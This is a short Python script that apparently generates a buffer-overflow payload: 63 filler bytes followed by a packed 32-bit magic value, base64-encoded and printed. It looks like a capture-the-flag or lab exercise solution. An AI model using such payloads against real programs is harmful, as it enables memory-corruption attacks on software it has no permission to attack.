
import sys
import struct
import base64

buf = b'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz'
buf += struct.pack('<I', 4006967535)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
